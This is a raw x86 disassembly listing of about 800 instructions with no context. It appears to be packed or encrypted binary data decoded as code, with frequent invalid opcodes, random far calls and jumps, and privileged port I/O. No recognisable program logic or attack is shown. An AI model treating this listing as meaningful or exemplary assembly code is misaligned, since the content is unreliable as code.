  411f71:	arpl   WORD PTR [esi],dx
  411f73:	cwde   
  411f74:	xchg   BYTE PTR [edx+0x0],dl
  411f77:	xchg   edx,eax
  411f78:	call   0xd306:0xead08926
  411f7f:	(bad)  
  411f81:	add    ebx,edi
  411f83:	add    al,0xa6
  411f85:	ret    
  411f86:	cmp    DWORD PTR [eax+0x49],edx
  411f89:	xor    BYTE PTR [edx-0x53],0xcc
  411f8d:	test   al,0x6
  411f8f:	inc    esp
  411f90:	jbe    0x411f6f
  411f92:	les    edx,FWORD PTR [ebx+ebx*1]
  411f95:	cmp    DWORD PTR [ebp-0x4e],esp
  411f98:	mov    ecx,0x401bf4dd
  411f9d:	ins    BYTE PTR es:[edi],dx
  411f9e:	shr    BYTE PTR [ebp+0x63],cl
  411fa1:	and    BYTE PTR [eax+edi*8-0x68],al
  411fa5:	sti    
  411fa6:	stos   BYTE PTR es:[edi],al
  411fa7:	in     eax,0x3a
  411fa9:	xchg   ebp,eax
  411faa:	sbb    cl,BYTE PTR [ecx]
  411fac:	call   0x5a46:0xc09ba38b
  411fb3:	or     ebx,ebp
  411fb5:	xor    ebp,DWORD PTR [ebx+eax*1+0x67]
  411fb9:	push   ecx
  411fba:	xchg   edx,eax
  411fbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411fbc:	ja     0x411fb4
  411fbe:	push   edi
  411fbf:	mov    ds:0xb35fdd4,eax
  411fc4:	aaa    
  411fc5:	out    dx,al
  411fc6:	outs   dx,DWORD PTR ds:[esi]
  411fc7:	dec    eax
  411fc8:	sbb    al,0xe5
  411fca:	jae    0x411fb8
  411fcc:	stos   BYTE PTR es:[edi],al
  411fcd:	or     edx,ebp
  411fcf:	fs sbb dh,ch
  411fd2:	imul   edi,ecx,0xf632123e
  411fd8:	xor    BYTE PTR [edx-0x19dddc46],bh
  411fde:	out    dx,eax
  411fdf:	div    BYTE PTR [eax-0x7f91fadd]
  411fe5:	in     al,dx
  411fe6:	adc    esi,DWORD PTR [ecx]
  411fe8:	out    dx,al
  411fe9:	in     eax,0xc7
  411feb:	sbb    cl,BYTE PTR ds:0xcb8d48ae
  411ff1:	in     eax,dx
  411ff2:	je     0x411fff
  411ff4:	push   edx
  411ff5:	rcr    DWORD PTR [edi+edi*2],cl
  411ff8:	pop    ebx
  411ff9:	pop    ecx
  411ffa:	cli    
  411ffb:	std    
  411ffc:	int    0x7e
  411ffe:	fs sti 
  412000:	jle    0x41207e
  412002:	loope  0x411fcb
  412004:	dec    esi
  412005:	inc    ecx
  412006:	shl    esi,cl
  412008:	popa   
  412009:	push   0xf492cca0
  41200e:	(bad)  
  412010:	or     DWORD PTR [edx],ebx
  412012:	xchg   ebx,edx
  412014:	xchg   ebp,eax
  412015:	lods   al,BYTE PTR ds:[esi]
  412016:	push   ebx
  412017:	mov    ah,0xe8
  412019:	sbb    DWORD PTR [ecx],0x6d
  41201c:	pop    edx
  41201d:	out    dx,al
  41201e:	aad    0x80
  412020:	test   BYTE PTR [eax+0x110c1cdd],dl
  412026:	lds    ebp,FWORD PTR [eax]
  412028:	xor    al,0x63
  41202a:	in     eax,dx
  41202b:	pop    es
  41202c:	mov    DWORD PTR [esi-0x147444db],eax
  412032:	cs int3 
  412034:	dec    edx
  412035:	inc    ecx
  412036:	into   
  412037:	pop    esp
  412038:	xchg   edx,eax
  412039:	xor    eax,0x4e344a5c
  41203e:	mov    ss,WORD PTR [ecx]
  412040:	gs xchg ebp,edx
  412043:	cmc    
  412044:	mov    ch,0x95
  412046:	sub    eax,0x5b32bd46
  41204b:	jp     0x411fe2
  41204d:	imul   edi,DWORD PTR [edi],0x5cc4adb1
  412053:	outs   dx,DWORD PTR ds:[esi]
  412054:	movaps XMMWORD PTR [ebx-0x31ab7730],xmm6
  41205b:	mov    esp,0x1d10deeb
  412060:	push   edx
  412061:	daa    
  412062:	loop   0x41203a
  412064:	div    BYTE PTR [ecx+ebx*2-0x43]
  412068:	sub    al,0x1b
  41206a:	loope  0x4120b4
  41206c:	or     al,0x1e
  41206e:	fist   DWORD PTR [edx]
  412070:	das    
  412071:	add    eax,DWORD PTR [ebx]
  412073:	jo     0x4120ac
  412075:	push   0x75
  412077:	call   FWORD PTR [ebx-0x48]
  41207a:	shl    DWORD PTR gs:[ebx],0xc2
  41207e:	mov    cl,0x8e
  412080:	mov    eax,eax
  412082:	mov    al,0xfb
  412084:	cmp    edi,DWORD PTR ds:0xad20ce07
  41208a:	xor    al,0xe
  41208c:	push   ecx
  41208d:	add    DWORD PTR [ecx-0x197bbb38],ebp
  412093:	mov    eax,0xf14cffd3
  412098:	mov    ?,WORD PTR [ebx]
  41209a:	fcmovbe st,st(1)
  41209c:	mov    eax,0x1bf34e45
  4120a1:	cmc    
  4120a2:	pop    eax
  4120a3:	inc    eax
  4120a4:	sub    eax,0x5285a33a
  4120a9:	and    eax,0xe83d642c
  4120ae:	add    BYTE PTR [ebp+eiz*4+0x72b16585],0x79
  4120b6:	xchg   bh,dh
  4120b8:	dec    edi
  4120b9:	sbb    al,0xdd
  4120bb:	inc    esp
  4120bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4120bd:	jb     0x41207e
  4120bf:	push   ecx
  4120c0:	dec    edi
  4120c1:	xchg   ecx,eax
  4120c2:	cld    
  4120c3:	fistp  WORD PTR [ecx+0x5b]
  4120c6:	xchg   DWORD PTR [eax+esi*4+0x62],esp
  4120ca:	sbb    al,0xd
  4120cc:	add    BYTE PTR [edx+esi*4-0x675ad5d6],al
  4120d3:	outs   dx,BYTE PTR ds:[esi]
  4120d4:	imul   ebp,DWORD PTR [ebx+0x31],0xffffffa0
  4120d8:	jb     0x4120b9
  4120da:	sbb    dl,BYTE PTR [ebx]
  4120dc:	mov    DWORD PTR [eax+0xb26e447],edx
  4120e2:	xchg   ecx,eax
  4120e3:	out    0x20,eax
  4120e5:	add    ecx,DWORD PTR [edx-0x1e]
  4120e8:	addr16 mov dh,0xbf
  4120eb:	push   ss
  4120ec:	cmp    DWORD PTR [ebx+0x3e],esp
  4120ef:	cld    
  4120f0:	test   al,0x7e
  4120f2:	imul   edi,DWORD PTR [edx+0x3bbed874],0x68954423
  4120fc:	add    ecx,DWORD PTR [edx+0x16e76c7b]
  412102:	lods   eax,DWORD PTR ds:[esi]
  412103:	adc    edx,esp
  412105:	rcl    esp,cl
  412107:	and    ah,bh
  412109:	xchg   BYTE PTR [ebp+0xaeeb8e],dl
  41210f:	mov    ebp,0xf69c7979
  412114:	inc    ecx
  412115:	gs jle 0x412146
  412118:	stos   BYTE PTR es:[edi],al
  412119:	rcl    BYTE PTR [edi+0x2ab3c407],cl
  41211f:	sub    BYTE PTR [eax-0x38],dh
  412122:	add    esp,DWORD PTR [ecx]
  412124:	scas   eax,DWORD PTR es:[edi]
  412125:	mov    ebp,0xc9ee4d0a
  41212a:	icebp  
  41212b:	inc    ebx
  41212c:	inc    ecx
  41212d:	push   ebp
  41212e:	cli    
  41212f:	pop    es
  412130:	cld    
  412131:	imul   ebx,DWORD PTR [edx],0xa6c628cf
  412137:	adc    eax,0xddcca64c
  41213c:	mov    esi,0x4110942a
  412141:	loopne 0x412187
  412143:	xor    al,0x10
  412145:	addr16 jnp 0x4120ca
  412148:	bndstx [ebx],bnd2
  41214b:	icebp  
  41214c:	xchg   edi,eax
  41214d:	rol    BYTE PTR [esi+edi*1-0x19a1a83],0xcb
  412155:	stc    
  412156:	fwait
  412157:	mov    bl,0xd2
  412159:	ins    BYTE PTR es:[edi],dx
  41215a:	js     0x412120
  41215c:	iret   
  41215d:	clc    
  41215e:	sbb    al,0x8d
  412160:	es push eax
  412162:	dec    ebx
  412163:	retf   
  412164:	in     eax,0xaf
  412166:	mov    bl,0xf0
  412168:	push   0x36cb137a
  41216d:	mov    edi,0xa05cde85
  412172:	dec    ebx
  412173:	mov    eax,cs:0xc22f1783
  412179:	int    0x70
  41217b:	and    BYTE PTR [esi-0x54],ch
  41217e:	ret    
  41217f:	jl     0x41211a
  412181:	outs   dx,DWORD PTR ds:[esi]
  412182:	sub    DWORD PTR [esp+ebx*4-0x56],ecx
  412186:	xor    esp,0xe9d2f65a
  41218c:	enter  0xfc44,0xf0
  412190:	sbb    bh,BYTE PTR [edi+0x1056ec63]
  412196:	repz adc eax,0xd5bec52a
  41219c:	jne    0x4121a6
  41219e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41219f:	mov    ds:0xf8be78c9,eax
  4121a4:	popf   
  4121a5:	cld    
  4121a6:	das    
  4121a7:	lods   eax,DWORD PTR ds:[esi]
  4121a8:	mov    DWORD PTR ds:0x4df9acca,esp
  4121ae:	jae    0x41217e
  4121b0:	adc    al,0xcc
  4121b2:	fsubr  QWORD PTR [ecx]
  4121b4:	(bad)  
  4121b5:	or     eax,0x125a0a64
  4121ba:	mov    ds:0xadebb3b2,eax
  4121bf:	add    al,BYTE PTR [ebx+0x18bb40ca]
  4121c5:	addr16 or al,0xf0
  4121c8:	cli    
  4121c9:	rcr    BYTE PTR [ebx],cl
  4121cb:	aas    
  4121cc:	add    eax,0xea4ece0e
  4121d1:	in     eax,0xa6
  4121d3:	cwde   
  4121d4:	retf   
  4121d5:	cmp    DWORD PTR [ecx+0x43ed1cf4],0x6b
  4121dc:	mov    bh,0xa0
  4121de:	xchg   ecx,eax
  4121df:	cmp    edx,DWORD PTR [edi-0x5a1175c7]
  4121e5:	jne    0x412207
  4121e7:	cmp    BYTE PTR [ebx],dl
  4121e9:	out    0x5,al
  4121eb:	ret    
  4121ec:	pop    ebx
  4121ed:	sti    
  4121ee:	aad    0xf4
  4121f0:	in     eax,0xdb
  4121f2:	sub    bl,bl
  4121f4:	cmp    dl,ch
  4121f6:	xchg   edx,eax
  4121f7:	mov    bh,0xe3
  4121f9:	fmul   DWORD PTR [esi-0x70ad4756]
  4121ff:	inc    edi
  412200:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412201:	mov    edi,0x8e9ee7f4
  412206:	xchg   bl,dh
  412208:	ror    BYTE PTR [esi+ebx*1+0x4befbfc6],cl
  41220f:	mov    dl,0x19
  412211:	leave  
  412212:	adc    dl,BYTE PTR [esi]
  412214:	pop    esi
  412215:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412216:	sub    esi,DWORD PTR [ecx+0x31]
  412219:	stos   DWORD PTR es:[edi],eax
  41221a:	sub    dl,BYTE PTR [eax-0x5378b9bf]
  412220:	ror    BYTE PTR [edi+0x1e5f1c8e],0x8d
  412227:	dec    ecx
  412228:	xor    al,cl
  41222a:	xor    bl,BYTE PTR [esi-0x49]
  41222d:	es sbb esp,eax
  412230:	mov    DWORD PTR [eax+0x6fd13c68],edx
  412236:	repz push ebx
  412238:	out    0xe3,eax
  41223a:	icebp  
  41223b:	mov    eax,edx
  41223d:	vpsrlq ymm1,ymm5,xmm4
  412241:	pushf  
  412242:	pop    edi
  412243:	fwait
  412244:	sahf   
  412245:	in     al,dx
  412246:	mov    al,ds:0xc7a8d0b9
  41224b:	pop    ss
  41224c:	aaa    
  41224d:	stos   DWORD PTR es:[edi],eax
  41224e:	hlt    
  41224f:	sahf   
  412250:	dec    edx
  412251:	or     BYTE PTR ss:[edi+0x506b8e0c],cl
  412258:	clc    
  412259:	call   0x4748:0x7c81cbc5
  412260:	push   ss
  412261:	mov    dh,0x75
  412263:	pop    ebp
  412264:	mov    esi,0xea3a5515
  412269:	mov    ds:0xcf64bb22,eax
  41226e:	push   0x3d5aa357
  412273:	and    eax,0x2e370dad
  412278:	mov    bh,BYTE PTR [eax+0x3d]
  41227b:	push   es
  41227c:	xchg   edx,eax
  41227d:	fwait
  41227e:	call   0x49f5:0x8b09b8d0
  412285:	das    
  412286:	mov    eax,ds:0x4f76a66b
  41228b:	mov    esi,0x14346280
  412290:	pop    edi
  412291:	sub    al,0xe2
  412293:	mov    cl,0x9f
  412295:	jno    0x412224
  412297:	cmc    
  412298:	cmp    al,0xf2
  41229a:	sub    edi,ecx
  41229c:	xchg   esi,eax
  41229d:	lahf   
  41229e:	push   ds
  41229f:	out    0x3a,eax
  4122a1:	or     ebx,DWORD PTR [eax-0x80]
  4122a4:	mov    edi,DWORD PTR [edx-0x53]
  4122a7:	hlt    
  4122a8:	(bad)  
  4122a9:	sub    al,0x46
  4122ab:	jp     0x41232a
  4122ad:	bound  ebx,QWORD PTR [edi-0x54]
  4122b0:	das    
  4122b1:	pop    eax
  4122b2:	jmp    0x4122ff
  4122b4:	fdivrp st(1),st
  4122b6:	fild   QWORD PTR ds:0xdd976394
  4122bc:	sub    al,0x87
  4122be:	sbb    ah,BYTE PTR [edx+0xeed8f99]
  4122c4:	dec    edi
  4122c5:	dec    esi
  4122c6:	popf   
  4122c7:	loopne 0x412258
  4122c9:	dec    ebx
  4122ca:	out    0xb4,eax
  4122cc:	dec    esp
  4122cd:	hlt    
  4122ce:	call   0x6c4b:0x8e73a72f
  4122d5:	ins    BYTE PTR es:[edi],dx
  4122d6:	inc    edi
  4122d7:	push   eax
  4122d8:	iret   
  4122d9:	outs   dx,DWORD PTR ds:[esi]
  4122da:	xor    BYTE PTR [ecx-0x3b9c600d],cl
  4122e0:	pusha  
  4122e1:	das    
  4122e2:	jae    0x41232e
  4122e4:	pop    edx
  4122e5:	shl    DWORD PTR [esi+0x2e4dcab5],0x32
  4122ec:	pop    ds
  4122ed:	dec    esi
  4122ee:	lea    edi,[esi+0x7d]
  4122f1:	adc    eax,0xf290f6e8
  4122f6:	adc    ch,BYTE PTR es:[ebp-0x41]
  4122fa:	mov    ah,0x6e
  4122fc:	mov    al,ds:0x8f0f3cf3
  412301:	inc    edx
  412302:	cmp    DWORD PTR [ebx-0x74],0xddbd68b1
  412309:	push   0x76
  41230b:	call   0x5ba2:0x79c83087
  412312:	mov    ds:0x2b028270,eax
  412317:	jns    0x41230d
  412319:	gs stc 
  41231b:	mov    esi,0x9ef4574a
  412320:	jmp    0x81227eeb
  412325:	out    dx,al
  412326:	pop    es
  412327:	xor    DWORD PTR [ecx+0x6c53597a],ebx
  41232d:	cmp    BYTE PTR [ebp-0x31297d07],0xeb
  412334:	inc    edi
  412335:	aad    0xa2
  412337:	dec    esp
  412338:	dec    edx
  412339:	ins    DWORD PTR es:[edi],dx
  41233a:	lods   eax,DWORD PTR ds:[esi]
  41233b:	sahf   
  41233c:	test   BYTE PTR [edx-0x22],ah
  41233f:	scas   eax,DWORD PTR es:[edi]
  412340:	jecxz  0x412359
  412342:	lahf   
  412343:	cmp    esi,DWORD PTR [ecx]
  412345:	mov    bl,0x12
  412347:	xor    DWORD PTR [edi+ebp*4-0x7d],edx
  41234b:	sahf   
  41234c:	call   DWORD PTR [esi]
  41234e:	push   ss
  41234f:	sub    al,BYTE PTR [edi+0x8]
  412352:	test   BYTE PTR [ebp+eiz*1-0x7c715d2b],dh
  412359:	push   ds
  41235a:	(bad)  
  41235b:	fisubr DWORD PTR [edx-0x74086bbe]
  412361:	inc    esi
  412362:	xchg   ebx,eax
  412363:	pop    ds
  412364:	pusha  
  412365:	jg     0x412308
  412367:	mov    BYTE PTR [ecx],dl
  412369:	neg    BYTE PTR [edx]
  41236b:	call   0x72ae:0xf41d727f
  412372:	cdq    
  412373:	ja     0x41233f
  412375:	xor    DWORD PTR [ebx-0x61],eax
  412378:	(bad)  
  412379:	cmp    dl,ch
  41237b:	adc    eax,0x37881f9a
  412380:	inc    cl
  412382:	loopne 0x41235b
  412384:	or     dh,BYTE PTR gs:[ecx+esi*1]
  412388:	push   es
  412389:	dec    edx
  41238a:	jo     0x4123a2
  41238c:	xlat   BYTE PTR ds:[ebx]
  41238d:	scas   eax,DWORD PTR es:[edi]
  41238e:	call   0x16379654
  412393:	push   ds
  412394:	std    
  412395:	scas   eax,DWORD PTR es:[edi]
  412396:	jo     0x4123cb
  412398:	ror    BYTE PTR [eax+0x5e48989f],cl
  41239e:	cmp    eax,0xd87763b5
  4123a3:	cmp    al,0x94
  4123a5:	cmp    eax,0x37c7e94f
  4123aa:	in     eax,0x6a
  4123ac:	sbb    DWORD PTR [edi-0x739c30e1],edi
  4123b2:	(bad)  
  4123b3:	sbb    DWORD PTR [ecx-0x7fa24396],esp
  4123b9:	or     ebp,DWORD PTR [ebx+edi*8]
  4123bc:	cmp    ebx,ecx
  4123be:	mov    edi,0xe24f60fb
  4123c3:	call   0x41b6394c
  4123c8:	lea    ebx,[ecx]
  4123ca:	inc    ebx
  4123cb:	inc    ebx
  4123cc:	bound  esi,QWORD PTR [eax+0x67bccb4d]
  4123d2:	inc    esi
  4123d3:	aam    0x16
  4123d5:	or     al,0xd0
  4123d8:	pop    eax
  4123d9:	jnp    0x41235d
  4123db:	sahf   
  4123dc:	arpl   WORD PTR [edi+edi*8+0x744c96a9],ax
  4123e3:	hlt    
  4123e4:	mov    bl,0x32
  4123e6:	js     0x412401
  4123e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4123e9:	aam    0xb5
  4123eb:	jle    0x4123e6
  4123ed:	jns    0x412426
  4123ef:	inc    edx
  4123f0:	fcom   QWORD PTR [ecx+0x28]
  4123f3:	add    edi,DWORD PTR [edx]
  4123f5:	and    esi,ecx
  4123f7:	xor    ah,BYTE PTR ds:0x7b7d90c9
  4123fd:	mov    edx,0x89b21a02
  412402:	jae    0x412439
  412404:	mov    ds,esi
  412406:	and    eax,0x77972da4
  41240b:	rol    DWORD PTR [ebx-0x6e],1
  41240e:	mov    ah,0x57
  412410:	mov    bl,0xa9
  412412:	fwait
  412413:	jmp    0x4123e5
  412415:	ret    
  412416:	mov    ebx,0x3442dc55
  41241b:	lahf   
  41241c:	rcr    DWORD PTR [edx-0x3e755281],0x59
  412423:	retf   
  412424:	sti    
  412425:	sub    ecx,edx
  412427:	jmp    0x412462
  412429:	mov    ebp,0x6aa6ec69
  41242e:	pushf  
  41242f:	xchg   esi,eax
  412430:	nop
  412431:	dec    esp
  412432:	add    dl,BYTE PTR [eax]
  412434:	in     al,dx
  412435:	sub    al,0xd9
  412437:	mov    dh,0x64
  412439:	cld    
  41243a:	(bad)  
  41243b:	lahf   
  41243c:	outs   dx,BYTE PTR ds:[esi]
  41243d:	sbb    BYTE PTR [edx+0x7a5e4620],ch
  412443:	popa   
  412444:	push   ss
  412445:	popa   
  412446:	lods   eax,DWORD PTR ds:[esi]
  412447:	or     eax,0x43cbc1f4
  41244c:	clc    
  41244d:	mov    bh,bl
  41244f:	push   ds
  412450:	int    0xce
  412452:	push   ebx
  412453:	pop    ds
  412454:	cdq    
  412455:	mov    dl,0x38
  412457:	lock outs dx,BYTE PTR ds:[esi]
  412459:	(bad)  
  41245a:	sub    eax,0x86366e47
  41245f:	add    ah,dh
  412461:	nop
  412462:	jnp    0x41241d
  412464:	retf   
  412465:	sbb    eax,0x4dd953e8
  41246a:	ror    edx,1
  41246c:	or     dl,BYTE PTR [edx+0x3b6aad28]
  412472:	arpl   WORD PTR [bx+si-0x306c],dx
  412477:	mov    bl,0x76
  412479:	mov    esp,0xfd0cf8e7
  41247e:	xchg   ebx,eax
  41247f:	scas   eax,DWORD PTR es:[edi]
  412480:	push   esi
  412481:	aaa    
  412482:	ins    DWORD PTR es:[edi],dx
  412483:	mov    ecx,0x697880a6
  412488:	push   0x8b040fa7
  41248d:	push   edx
  41248e:	push   cs
  41248f:	int    0x49
  412491:	or     cl,bl
  412493:	push   cs
  412494:	jns    0x4124ad
  412496:	pop    es
  412497:	mov    ecx,0xa15f4811
  41249c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41249d:	mov    eax,ds:0xb3a3c081
  4124a2:	(bad)  
  4124a3:	out    dx,al
  4124a4:	dec    esp
  4124a5:	(bad)  
  4124a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124a7:	or     BYTE PTR [ebx-0x67],bh
  4124aa:	imul   esp,DWORD PTR [ebp+0x24],0x5d
  4124ae:	xchg   ecx,eax
  4124af:	int3   
  4124b0:	cld    
  4124b1:	mov    esp,0x2e7c2f30
  4124b6:	test   esp,0x1cc46021
  4124bc:	pop    ecx
  4124bd:	rcr    BYTE PTR [ecx],1
  4124bf:	retf   
  4124c0:	inc    eax
  4124c1:	aaa    
  4124c2:	push   edx
  4124c3:	clc    
  4124c4:	push   ds
  4124c5:	push   DWORD PTR [ebp+0x70f3353c]
  4124cb:	in     al,0xa8
  4124cd:	and    al,0x40
  4124cf:	in     al,dx
  4124d0:	mov    ecx,0x61d6774a
  4124d5:	lds    edi,FWORD PTR [edx+0x67a814ed]
  4124db:	dec    ebx
  4124dc:	(bad)  
  4124de:	inc    ecx
  4124df:	int3   
  4124e0:	mov    bl,0xc7
  4124e2:	aas    
  4124e3:	mov    edx,0x17f05484
  4124e8:	inc    edi
  4124e9:	in     al,0xc7
  4124eb:	dec    esp
  4124ec:	cmp    eax,0xae675855
  4124f1:	inc    edi
  4124f2:	push   0xffffffd0
  4124f4:	fwait
  4124f5:	jge    0x41253e
  4124f7:	icebp  
  4124f8:	cwde   
  4124f9:	or     al,0xe9
  4124fb:	scas   al,BYTE PTR es:[edi]
  4124fc:	add    ah,al
  4124fe:	and    esi,DWORD PTR ds:0x1a595015
  412504:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412505:	into   
  412506:	mov    ds:0x340af882,eax
  41250b:	mov    eax,ds:0x7de83918
  412510:	out    dx,eax
  412511:	push   0xd8d585ea
  412516:	dec    ecx
  412517:	cmc    
  412518:	out    dx,eax
  412519:	test   al,0x9c
  41251b:	mov    eax,ds:0xd887b14e
  412520:	test   al,0x59
  412522:	push   esp
  412523:	enter  0xe991,0x78
  412527:	sbb    edx,DWORD PTR [ebx]
  412529:	iret   
  41252a:	xchg   edx,eax
  41252b:	xor    BYTE PTR [ecx],al
  41252d:	jne    0x4124dd
  41252f:	dec    edi
  412530:	out    dx,eax
  412531:	xor    al,0xbf
  412533:	push   0xffffffdf
  412535:	retf   0x900e
  412538:	pop    ebp
  412539:	add    DWORD PTR [eax+edi*8-0x53],0xffffffc1
  41253e:	ss cmp eax,0xca822a9a
  412544:	fs inc edi
  412546:	imul   esi,DWORD PTR [edx-0x67c15306],0x7c
  41254d:	fisub  WORD PTR [eax-0x48]
  412550:	xor    eax,edi
  412552:	adc    al,0xcb
  412554:	(bad)  
  412555:	jl     0x4125b1
  412557:	sbb    DWORD PTR [edi+ecx*1+0x43],esp
  41255b:	fnstsw ax
  41255d:	das    
  41255e:	rcr    BYTE PTR [edi],0x2c
  412561:	imul   edx,DWORD PTR [edi+0x33150095],0xffffffbb
  412568:	xor    BYTE PTR [ecx-0x4f79e6c2],dh
  41256e:	and    DWORD PTR [ecx],edi
  412570:	xor    ebp,DWORD PTR [edx-0x7fd21f04]
  412576:	int3   
  412577:	dec    DWORD PTR [ebx+0x586196b4]
  41257d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41257e:	mov    WORD PTR [esp+ecx*1],cs
  412581:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412582:	xlat   BYTE PTR ds:[ebx]
  412583:	jno    0x4125e8
  412585:	pop    ebx
  412586:	jp     0x412547
  412588:	dec    esp
  412589:	sbb    edx,esi
  41258b:	shl    esp,1
  41258d:	ret    
  41258e:	aam    0x4
  412590:	enter  0x49dc,0x9e
  412594:	push   es
  412595:	mov    WORD PTR [edi+ebx*8],ss
  412598:	pop    ebp
  412599:	add    al,BYTE PTR [eax-0x1e340ee5]
  41259f:	add    esp,DWORD PTR [edx+0x2d211193]
  4125a5:	mov    ah,0xb0
  4125a7:	push   ds
  4125a8:	cmp    eax,0x385216fa
  4125ad:	push   ss
  4125ae:	sahf   
  4125af:	jmp    0xd827:0x16fe6c40
  4125b6:	jmp    FWORD PTR [ecx-0x1a7d722f]
  4125bc:	es clc 
  4125be:	sub    BYTE PTR [eax],ah
  4125c0:	es je  0x41256e
  4125c3:	shl    DWORD PTR [esi],1
  4125c5:	into   
  4125c6:	je     0x412597
  4125c8:	test   BYTE PTR [ecx+0x6b],bh
  4125cb:	pop    esp
  4125cc:	cs sub eax,0x5c5b326c
  4125d2:	sbb    bl,bh
  4125d4:	(bad)  
  4125d5:	xchg   edx,eax
  4125d6:	inc    eax
  4125d7:	xchg   esi,eax
  4125d8:	add    al,0x33
  4125da:	scas   al,BYTE PTR es:[edi]
  4125db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4125dc:	inc    eax
  4125dd:	dec    esi
  4125de:	adc    DWORD PTR [edi+0x6970f8cc],eax
  4125e4:	(bad)  
  4125e5:	loop   0x4125fe
  4125e7:	shr    DWORD PTR [ecx],cl
  4125e9:	leave  
  4125ea:	fdivr  QWORD PTR ds:0x9969fccb
  4125f0:	enter  0x28c,0x6b
  4125f4:	in     al,dx
  4125f5:	iret   
  4125f6:	arpl   WORD PTR [ebp-0x19bbacb7],sp
  4125fc:	and    eax,0xc460e33a
  412601:	xor    ebx,ebx
  412603:	pop    ebp
  412604:	jmp    0xa862d07a
  412609:	sahf   
  41260a:	xor    eax,0xa0cb58da
  41260f:	lahf   
  412610:	sub    DWORD PTR [edi+0xeedfbf6],esp
  412616:	out    0xc2,eax
  412618:	aam    0xf7
  41261a:	push   eax
  41261b:	or     edx,edi
  41261d:	pop    esp
  41261e:	push   0x7900098c
  412623:	cmp    BYTE PTR [edi+0x5623413],bl
  412629:	add    DWORD PTR es:[eax-0x2d95a176],eax
  412630:	and    DWORD PTR [edi+0x5b013f80],edi
  412636:	(bad)  
  412637:	adc    al,0xd4
  412639:	iret   
  41263a:	mov    ?,ebx
  41263c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41263d:	and    BYTE PTR [esi],0xac
  412640:	in     eax,dx
  412641:	pop    edi
  412642:	mov    dl,0x13
  412644:	sahf   
  412645:	dec    edi
  412646:	dec    ax
  412648:	test   eax,0x65effb0f
  41264d:	scas   eax,DWORD PTR es:[edi]
  41264e:	lock pushfw 
  412651:	aam    0xb3
  412653:	inc    esi
  412654:	test   eax,0x84e57d0f
  412659:	outs   dx,DWORD PTR ds:[esi]
  41265a:	fisttp DWORD PTR [edx-0x6c]
  41265d:	(bad)  
  41265e:	or     ebp,edi
  412660:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412661:	lds    ebx,FWORD PTR [edx+0x19]
  412664:	fimul  DWORD PTR [ebx]
  412666:	jle    0x41265a
  412668:	femms  
  41266a:	std    
  41266b:	pop    edx
  41266c:	pop    ds
  41266d:	mov    WORD PTR [esi],cs
  41266f:	mov    ds:0xb65daea5,eax
  412674:	xchg   edx,eax
  412675:	ins    DWORD PTR es:[edi],dx
  412676:	jns    0x4126e2
  412678:	mov    dh,0x6f
  41267a:	cmp    BYTE PTR [edi-0x4c],bh
  41267d:	sub    cl,BYTE PTR [esi-0x2a25d69]
  412683:	rcl    DWORD PTR [ecx],1
  412685:	and    DWORD PTR [edx-0x74846bf9],eax
  41268b:	adc    ecx,DWORD PTR [edx+edi*8-0x6]
  41268f:	imul   esi,DWORD PTR [ecx],0x449633cf
  412695:	fwait
  412696:	push   ecx
  412697:	xor    al,0xbe
  412699:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41269a:	pushf  
  41269b:	push   edx
  41269c:	inc    esp
  41269d:	pop    ebx
  41269e:	or     ah,BYTE PTR [ecx+0x374e6522]
  4126a4:	mov    ds:0x7b14735a,al
  4126a9:	jo     0x4126d0
  4126ab:	repz pop edi
  4126ad:	(bad)  
  4126af:	xchg   BYTE PTR [ecx-0x36],bl
  4126b2:	sti    
  4126b3:	stc    
  4126b4:	adc    DWORD PTR [ebp+0x6d],esi
  4126b7:	and    DWORD PTR [eax-0x22787f56],esi
  4126bd:	jb     0x4126d4
  4126bf:	xchg   edi,eax
  4126c0:	dec    esp
  4126c1:	int    0xb0
  4126c3:	std    
  4126c4:	repz xor eax,0xc32c186e
  4126ca:	mov    esi,0x6cb2a4f2
  4126cf:	loope  0x4126b4
  4126d1:	mov    cl,BYTE PTR [ecx-0x42]
  4126d4:	inc    ebp
  4126d5:	pop    ss
  4126d6:	fist   WORD PTR [ecx+0x46]
  4126d9:	push   ds
  4126da:	inc    ebp
  4126db:	inc    ebx
  4126dc:	jnp    0x4126b2
  4126de:	scas   al,BYTE PTR es:[edi]
  4126df:	iret   
  4126e0:	or     bl,BYTE PTR [esp+ebp*8+0x77d2f5c8]
  4126e7:	bound  ebx,QWORD PTR [edx+0x12d6ae80]
  4126ed:	inc    ebx
  4126ee:	push   0xe6c8d5b0
  4126f3:	in     eax,dx
  4126f4:	cmc    
  4126f5:	add    ebp,DWORD PTR [ebp-0x55fd5855]
  4126fb:	retf   
  4126fc:	rcl    BYTE PTR [esi+0x1a2ced1b],0x30
  412703:	lock (bad) 
  412706:	inc    esi
  412707:	shl    bl,0x36
  41270a:	dec    esi
  41270b:	inc    ecx
  41270c:	xchg   esp,eax
  41270d:	mov    bl,0x2c
  41270f:	out    0xa5,eax
  412711:	mov    BYTE PTR [eax],bl
  412713:	pop    ds
  412714:	imul   eax,DWORD PTR [eax],0x339c9392
  41271a:	sar    BYTE PTR [eax+eiz*4-0x29],cl
  41271e:	push   edi
  41271f:	enter  0xb559,0x92
  412723:	ror    BYTE PTR [edi+0x1d9157d7],1
  412729:	ss push es
  41272b:	stos   BYTE PTR es:[edi],al
  41272c:	mov    esi,0x23146e26
  412731:	pop    esi
  412732:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412733:	pop    esi
  412734:	jbe    0x412753
  412736:	xchg   bl,ah
  412738:	mov    al,ds:0xbd5aebe6
  41273d:	push   0xffffffab
  41273f:	outs   dx,BYTE PTR ds:[esi]
  412740:	call   0x33c59f8f
